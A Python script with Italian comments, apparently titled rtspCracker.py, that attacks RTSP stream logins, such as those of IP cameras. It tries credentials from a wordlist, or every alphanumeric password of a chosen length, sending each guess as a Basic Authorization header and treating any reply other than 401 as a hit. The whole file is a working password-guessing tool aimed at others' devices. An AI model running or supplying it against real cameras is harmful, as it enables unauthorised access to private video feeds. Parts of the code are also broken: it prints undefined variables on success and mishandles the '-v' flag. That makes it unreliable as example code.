import sys
import socket
from base64 import b64encode
import itertools
import string

#Header semplice rtsp
# OPTIONS rtsp://192.168.1.10:554/ RTSP/1.0
# CSeq: 1
# Authorization: Basic <base64_credentials>
# User-Agent: MyRTSPClient/1.0
#si crittano le credenziali in base64 per non lasciarle in chiaro durante lo scambio di messaggi -_-
#insomma facili da rubare

def rtspBruteForceDictionary(host, port, credentials, verbose):
    #apro il file delle credenziali in lettura
    with open(credentials, "r") as credList:
        
        #leggo una riga per volta
        for line in credList:
            
            #leggo le credenziali dal file formato username:password e le critto in base64
            userPasswd = b64encode(line.strip().encode()).decode()
            rtspMessage = (
                f"OPTIONS rtsp://{host}:{port}/ RTSP/1.0\r\n"
                f"CSeq: 1\r\n"
                f"Authorization: Basic {userPasswd}\r\n"
            )

            # Prova a connettersi via socket
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(3)  # Timeout breve per velocizzare
                    s.connect((host, port))
                    s.send(rtspMessage.encode())
                    response = s.recv(1024).decode()
                    
                    # Se la risposta non contiene "401 Unauthorized", è un successo
                    if "401 Unauthorized" not in response:
                        if verbose:
                            print(f"Accesso riuscito: {username}:{password} su {host}:{port}")
                        else:
                            print(f"{username}:{password}")
                        return True
            except socket.error as e:
                if verbose:
                    print(f"Errore di connessione su {host}:{port} - {e}")
                continue
    return False



def rtspBruteForce(host, port, username, passwordLength, verbose):

    #indica che la combinazione deve essere di lettere maiuscole/minuscole e numeri
    chars = string.ascii_letters + string.digits
    
    #crea le varie combinazioni per la stringa con la lunghezza definita nei parametri
    for combination in itertools.product(chars, repeat=passwordLength):

        #"".join(combination) combination è una lista di caratteri, questo la rende una stringa intera
        
        userCombination = username+":"+("".join(combination))
        userPasswd = b64encode(userCombination.encode()).decode()
        rtspMessage = (
            f"OPTIONS rtsp://{host}:{port}/ RTSP/1.0\r\n"
            f"CSeq: 1\r\n"
            f"Authorization: Basic {userPasswd}\r\n"
        )

        # Prova a connettersi via socket
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)  # Timeout breve per velocizzare
                s.connect((host, port))
                s.send(rtspMessage.encode())
                response = s.recv(1024).decode()
                    
                # Se la risposta non contiene "401 Unauthorized", è un successo
                if "401 Unauthorized" not in response:
                    if verbose:
                        print(f"Accesso riuscito: {username}:{password} su {host}:{port}")
                    else:
                        print(f"{username}:{password}")
                    return True
        except socket.error as e:
            if verbose:
                print(f"Errore di connessione su {host}:{port} - {e}")
            continue

    return False


# Esegui brute-force su host e porta specifici
def main():

    # Configura gli IP e le porte RTSP che vuoi testare
    ip = sys.argv[1]  # Usa il range della tua rete
    rtspPort = int(sys.argv[2])
    index = sys.argv.index("-v")

    if index >= 0:
        verbose = True
    else:
        verbose = False


    if verbose:
        print("target ip # "+ip)
        print("rtsp port # "+str(rtspPort))

    if sys.argv[3] == "--bruteforce":
        
        username = sys.argv[4]
        passwordLength = int(sys.argv[5])
        if verbose:
            print("username # "+username)
            print("lunghezza della password # "+str(passwordLength))

        if not rtspBruteForce(ip, rtspPort, username, passwordLength, verbose):
            print("Accesso non riuscito")

    else:
        
        credentialList = sys.argv[3]
        if verbose:
            print("credential list file # "+credentialList)

        if not rtspBruteForceDictionary(ip, rtspPort, credentialList, verbose):
            print("Accesso non riuscito")
    

def help():
    print("rtspCracker.py <ip> <rtsp port> <credentials list file> -v")
    print("or")
    print("rtspCracker.py <ip> <rtsp port> --bruteforce <username> <password length> -v")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "-h" or sys.argv[1] == "--help":
            help()
        else:
            main()
    else:
        print("parametri mancanti")

